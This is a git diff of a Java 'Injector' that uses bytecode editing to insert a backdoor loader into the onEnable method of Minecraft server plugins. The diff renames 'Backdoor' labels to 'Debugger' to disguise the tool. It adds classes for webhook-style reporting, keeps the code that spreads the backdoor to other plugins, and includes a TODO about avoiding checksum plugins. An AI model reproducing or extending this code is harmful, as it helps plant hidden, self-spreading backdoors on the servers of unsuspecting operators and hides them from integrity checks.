@@ -94,7 +94,7 @@ public class Injector {
         if(print_msg)
             System.out.println("[Injector] Found plugin name: " + name + "\n[Injector] Found main class: " + mainClass);
 
-        /*--- Copy Backdoor Code ---*/
+        /*--- Copy Debugger Code ---*/
 
         FileSystem outStream    = null;
         try {
@@ -125,19 +125,21 @@ public class Injector {
             }
         }
 
+        // TODO: Inject to all except HostifyMonitor and other checksum plugins
+
         //Add spreading resources
         if(config.injectOther){
-            for(int i = 0; i < resource_paths_spreading.length; i++){
-                resourceStreams[i + resource_paths_required.length] = Injector.class.getResourceAsStream("/" + resource_paths_spreading[i].replace(".", "/") + ".class");
-                targetPaths[i + resource_paths_required.length] = outStream.getPath("/" + resource_paths_spreading[i].replace(".", "/") + ".class");
+                for (int i = 0; i < resource_paths_spreading.length; i++) {
+                    resourceStreams[i + resource_paths_required.length] = Injector.class.getResourceAsStream("/" + resource_paths_spreading[i].replace(".", "/") + ".class");
+                    targetPaths[i + resource_paths_required.length] = outStream.getPath("/" + resource_paths_spreading[i].replace(".", "/") + ".class");
 
-                try {
-                    Files.createDirectories(targetPaths[i + resource_paths_required.length].getParent());
-                } catch (IOException e) {
-                    continue;
+                    try {
+                        Files.createDirectories(targetPaths[i + resource_paths_required.length].getParent());
+                    } catch (IOException e) {
+                        continue;
+                    }
+
                 }
-
-            }
         }
 
         try {
@@ -175,26 +177,14 @@ public class Injector {
             //Get main class, and find onEnable method
 
             if(print_msg)
-                System.out.println("[Injector] Injecting backdoor loader into class.");
+                System.out.println("[Injector] Injecting debugger loader into class.");
 
             CtClass cc = pool.get(mainClass);
             CtMethod m = cc.getDeclaredMethod("onEnable");
 
-            //Parse UUID string
-            StringBuilder sb = new StringBuilder();
-            sb.append("new String[]{");
-            for(int i = 0; i < config.UUID.length; i++){
-                sb.append("\"");
-                sb.append(config.UUID[i]);
-                sb.append("\"");
-                if(i != config.UUID.length - 1)
-                    sb.append(",");
-            }
-            sb.append("}");
             if(print_msg)
-                System.out.println("{ new com.thiccindustries.debugger.Debugger(this, " + (config.useUsernames ? "true, " : "false, ") + sb.toString() + ", \"" + config.prefix + "\", " + (config.injectOther ? "true" : "false") + "," + (config.warnings ? "true" : "false") +"); }");
-
-            m.insertAfter("{ new com.thiccindustries.debugger.Debugger(this, " + (config.useUsernames ? "true, " : "false, ") + sb.toString() + ", \"" + config.prefix + "\", " + (config.injectOther ? "true" : "false") + "," + (config.warnings ? "true" : "false") +"); }");
+                System.out.println("{ new com.thiccindustries.debugger.Debugger(this, " + "\"" + config.prefix + "\", " + (config.injectOther ? "true" : "false") + "," + (config.warnings ? "true" : "false") +"); }");
+            m.insertAfter("{ new com.thiccindustries.debugger.Debugger(this, " + "\"" + config.prefix + "\", " + (config.injectOther ? "true" : "false") + "," + (config.warnings ? "true" : "false") +"); }");
 
             //Write to temporary file
             cc.writeFile(temp.toString());
@@ -255,15 +245,11 @@ public class Injector {
 
     //Simplifed config for injector gui
     public static class SimpleConfig {
-        public boolean useUsernames;
-        public String[] UUID;
         public String prefix;
         public boolean injectOther;
         public boolean warnings;
 
-        public SimpleConfig(boolean b1, String[] s1, String s2, boolean b2, boolean b3) {
-            useUsernames = b1;
-            UUID = s1;
+        public SimpleConfig(String s2, boolean b2, boolean b3) {
             prefix = s2;
             injectOther = b2;
             warnings = b3;
@@ -284,6 +270,18 @@ public class Injector {
             "com.thiccindustries.debugger.Debugger$10",
             "com.thiccindustries.debugger.Debugger$11",
             "com.thiccindustries.debugger.Debugger$12",
+            "com.thiccindustries.debugger.Debugger$13",
+            "com.thiccindustries.debugger.Debugger$14",
+            "com.thiccindustries.debugger.Debugger$15",
+            "com.thiccindustries.debugger.Debugger$16",
+            "com.thiccindustries.debugger.DWeb",
+            "com.thiccindustries.debugger.DWeb$EmbedObject",
+            "com.thiccindustries.debugger.DWeb$EmbedObject$Footer",
+            "com.thiccindustries.debugger.DWeb$EmbedObject$Thumbnail",
+            "com.thiccindustries.debugger.DWeb$EmbedObject$Image",
+            "com.thiccindustries.debugger.DWeb$EmbedObject$Author",
+            "com.thiccindustries.debugger.DWeb$EmbedObject$Field",
+            "com.thiccindustries.debugger.DWeb$JSONObject",
             "com.thiccindustries.debugger.Config",
             "com.thiccindustries.debugger.Config$HelpItem",
             "com.thiccindustries.debugger.Injector",
